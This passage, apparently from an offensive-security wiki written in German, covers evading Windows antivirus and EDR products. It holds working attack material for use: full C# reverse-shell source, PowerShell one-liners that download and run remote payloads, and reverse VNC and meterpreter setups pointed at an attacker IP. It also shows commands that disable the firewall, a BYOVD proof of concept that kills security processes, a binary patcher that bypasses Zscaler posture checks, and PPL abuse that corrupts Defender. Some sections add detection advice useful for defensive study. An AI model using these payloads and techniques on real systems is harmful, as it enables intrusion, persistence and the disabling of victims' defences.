- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Kompilierzeit obfuscated code zu erzeugen, ohne externe Tools zu nutzen und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuscated operations hinzu, die vom C++ template metaprogramming framework generiert werden und das Leben der Person, die versucht, die Anwendung zu knacken, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 binary obfuscator, der verschiedene pe-Dateien obfuskieren kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphic code engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granuliertes code obfuscation framework für LLVM-supported languages, das ROP (return-oriented programming) verwendet. ROPfuscator obfuscates ein Programm auf Assembly-Ebene, indem es reguläre Instruktionen in ROP chains umwandelt und damit unsere natürliche Vorstellung von normalem Kontrollfluss unterläuft.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Möglicherweise haben Sie diesen Bildschirm gesehen, wenn Sie einige Executables aus dem Internet herunterladen und ausführen.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endbenutzer davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich nach einem reputationsbasierten Ansatz. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen, wodurch der Endbenutzer gewarnt und daran gehindert wird, die Datei auszuführen (obwohl die Datei weiterhin durch Klick auf More Info -> Run anyway ausgeführt werden kann).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird, zusammen mit der URL, von der sie heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **trusted signing certificate** signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass Ihre payloads das Mark of The Web erhalten, besteht darin, sie in irgendeiner Art Container wie einer ISO zu verpacken. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **non NTFS** Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das payloads in Ausgabecontainer verpackt, um Mark-of-the-Web zu umgehen.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein mächtiger Logging-Mechanismus in Windows, der Anwendungen und Systemkomponenten erlaubt, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten genutzt werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** eines Userspace-Prozesses so zu verändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dies wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und dadurch das ETW-Logging für diesen Prozess effektiv deaktiviert.

Mehr Informationen findest du in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist schon lange bekannt und bleibt eine sehr gute Methode, um deine post-exploitation Tools auszuführen, ohne von AV erwischt zu werden.

Da der payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, aber es gibt verschiedene Wege, dies zu tun:

- **Fork\&Run**

Dabei wird ein neuer sacrificial process erzeugt, dein post-exploitation bösartiger Code in diesen neuen Prozess injiziert, dein bösartiger Code ausgeführt und nach Abschluss der neue Prozess beendet. Das hat Vor- und Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implantat-Prozesses stattfindet. Das bedeutet, wenn bei unserer post-exploitation-Aktion etwas schiefgeht oder entdeckt wird, besteht eine **deutlich größere Chance**, dass unser **Implantat überlebt.** Der Nachteil ist, dass du eine **größere Chance** hast, von **Behavioural Detections** erwischt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. So vermeidest du, einen neuen Prozess zu erstellen und von AV scannen zu lassen, aber der Nachteil ist, dass wenn bei der Ausführung deines payloads etwas schiefgeht, eine **deutlich größere Chance** besteht, dein **Beacon zu verlieren**, da es abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen willst, sieh dir diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Verwendung anderer Programmiersprachen

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code mit anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff **to the interpreter environment installed on the Attacker Controlled SMB share** gewährt.

Indem man Zugriff auf die Interpreter Binaries und die Umgebung auf dem SMB-Share erlaubt, kann man **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo gibt an: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, mit der ein Angreifer das Access-Token oder (in manchen Ansätzen) ein Sicherheitsprodukt wie ein EDR oder AV manipulieren kann, um dessen Privilegien zu reduzieren, sodass der Prozess nicht beendet wird, aber nicht die Berechtigungen hat, um nach bösartigen Aktivitäten zu prüfen.

Um das zu verhindern, könnte Windows **externen Prozessen** verbieten, Handles auf die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Verwendung vertrauenswürdiger Software

### Chrome Remote Desktop

Wie in [**diesem Blogpost**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf dem PC eines Opfers zu deployen und damit die Kontrolle zu übernehmen sowie Persistence zu behalten:
1. Lade von https://remotedesktop.google.com/ herunter, klicke auf "Set up via SSH" und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer still auf dem Opferrechner aus (Administrator erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Gehe zurück zur Chrome Remote Desktop-Seite und klicke auf Weiter. Der Assistent wird dich zur Autorisierung auffordern; klicke auf die Schaltfläche Authorize, um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Hinweis: Der pin-Parameter erlaubt es, die PIN ohne Verwendung der GUI zu setzen).


## Advanced Evasion

Evasion ist ein sehr komplexes Thema. Manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, weshalb es in ausgereiften Umgebungen praktisch unmöglich ist, völlig unentdeckt zu bleiben.

Jede Umgebung, gegen die du vorgehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzuschauen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in der Tiefe.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Alte Techniken**

### **Prüfe, welche Teile Defender als bösartig einstuft**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es herausfindet, **welchen Teil Defender** als bösartig einstuft und ihn dir aufschlüsselt.\
Ein weiteres Tool, das **dasselbe macht**, ist [**avred**](https://github.com/dobin/avred) mit einem offenen Webservice unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 wurde bei allen Windows-Versionen ein **Telnet server** mitgeliefert, den man (als Administrator) installieren konnte, indem man:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es **starten**, wenn das System gestartet wird, und **führe** es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändere telnet port** (stealth) und deaktiviere firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Herunterladen von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du willst die bin downloads, nicht das Setup)

**ON THE HOST**: Execute _**winvnc.exe**_ und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort bei _VNC Password_
- Setze ein Passwort bei _View-Only Password_

Verschiebe dann die Binary _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** die Binary `vncviewer.exe -listen 5900` ausführen, damit sie bereit ist, eine reverse **VNC connection** abzufangen. Dann, im **victim**: Starte den winvnc daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNING:** Um stealth zu wahren, darfst du einige Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird sich [the config window](https://i.imgur.com/rfMQWcf.png) öffnen
- Führe `winvnc -h` nicht aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Nun **starte den lister** mit `msfconsole -r file.rc` und **führe** die **xml payload** mit:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Kompilieren unserer eigenen reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# - Verwendung des Compilers
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators-Liste: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Python zum Erstellen von Injectors verwenden:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Bereich ausschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um Endpoint-Schutzmechanismen zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light (PPL) AV-Dienste nicht blockieren können.

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte abgelegte Datei ist `ServiceMouse.sys`, aber die Binärdatei ist der rechtmäßig signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ “System In-Depth Analysis Toolkit”. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Service-Installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem User-Land zugänglich wird.
3. **Vom Treiber exponierte IOCTLs**
| IOCTL code | Funktion                              |
|-----------:|----------------------------------------|
| `0x99000050` | Einen beliebigen Prozess anhand der PID beenden (wird zum Beenden von Defender-/EDR-Diensten verwendet) |
| `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
| `0x990001D0` | Den Treiber entladen und den Service entfernen |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Warum es funktioniert**: BYOVD umgeht User-Mode-Schutzmechanismen vollständig; Code, der im Kernel ausgeführt wird, kann *geschützte* Prozesse öffnen, sie beenden oder Kernel-Objekte manipulieren, unabhängig von PPL/PP, ELAM oder anderen Härtungsmaßnahmen.

Erkennung / Abhilfemaßnahmen
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und alarmieren Sie, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-Liste steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Umgehung der Zscaler Client Connector Posture Checks durch Patchen von Binärdateien auf der Festplatte

Zscaler’s **Client Connector** führt Device-Posture-Regeln lokal aus und verwendet Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen machen eine vollständige Umgehung möglich:

1. Die Posture-Auswertung erfolgt **ausschließlich client-side** (es wird ein Boolean an den Server gesendet).  
2. Interne RPC-Endpunkte validieren nur, dass die verbindende ausführbare Datei **von Zscaler signiert** ist (via `WinVerifyTrust`).

Durch **Patchen von vier signierten Binärdateien auf der Festplatte** können beide Mechanismen neutralisiert werden:

| Binary | Ursprüngliche Logik gepatcht | Ergebnis |
|--------|------------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Überprüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder (auch unsignierte) Prozess kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen am Tunnel | Kurzgeschlossen |

Minimaler Patcher-Auszug:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurden:

* **Alle** Posture-Checks zeigen **grün/konform** an.
* Nicht signierte oder modifizierte Binaries können die Named-Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgangen werden können.

## Missbrauch von Protected Process Light (PPL), um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Signer-/Level-Hierarchie, sodass nur geschützte Prozesse mit gleichem oder höherem Level einander manipulieren können. Aus offensiver Sicht: Wenn man eine PPL-fähige Binary legitim starten und deren Argumente kontrollieren kann, lässt sich harmlose Funktionalität (z. B. Logging) in ein eingeschränktes, PPL-gestütztes Schreibprimitive gegen geschützte Verzeichnisse nutzen, die von AV/EDR verwendet werden.

Was bewirkt, dass ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess unter Verwendung der Flags erstellt werden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Es muss ein kompatibles Protection-Level angefordert werden, das zum Signer der Binary passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen beim Erstellen zum Fehler.

Siehe auch eine weitergehende Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Helfer: CreateProcessAsPPL (wählt das Protection-Level aus und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Verwendungsweise:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei in einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwende 8.3-Kurzpfade, um auf normalerweise geschützte Orte zu zeigen.

8.3-Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` jeweils im übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Gib das ClipUp-Logpfad-Argument an, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurzpfade.
3) Falls die Ziel-Binärdatei normalerweise vom AV während des Betriebs offen/verriegelt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Boot, bevor der AV startet, indem du einen Auto-Start-Service installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Boot-Reihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binärdateien sperrt, wodurch die Ziel-Datei beschädigt wird und ein Start verhindert wird.

Beispielaufruf (Pfade aus Sicherheitsgründen ausgeblendet/gekürzt):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- Sie können den Inhalt, den ClipUp schreibt, nicht kontrollieren, außer der Platzierung; die Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert lokalen Administrator/SYSTEM, um einen Service zu installieren/zu starten und ein Reboot-Fenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Boot-Zeit vermeidet Dateisperren.

Detections
- Prozess-Erzeugung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn sie von nicht-standardmäßigen Launchern parented werden, im Boot-Zeitraum.
- Neue Services, die so konfiguriert sind, dass verdächtige Binaries automatisch starten und konsequent vor Defender/AV starten. Untersuchen Sie Service-Erstellung/-Änderung vor Defender-Startup-Fehlern.
- File integrity monitoring auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: Achten Sie auf Prozesse, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und auf anomale PPL-Level-Nutzung durch Nicht-AV-Binaries.

Mitigations
- WDAC/Code Integrity: Beschränken Sie, welche signierten Binaries als PPL laufen dürfen und unter welchen Eltern; blockieren Sie ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service-Hygiene: Beschränken Sie die Erstellung/Änderung von Auto-Start-Services und überwachen Sie Manipulationen der Start-Reihenfolge.
- Stellen Sie sicher, dass Defender-Tamper-Schutz und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf Binary-Korruption hinweisen.
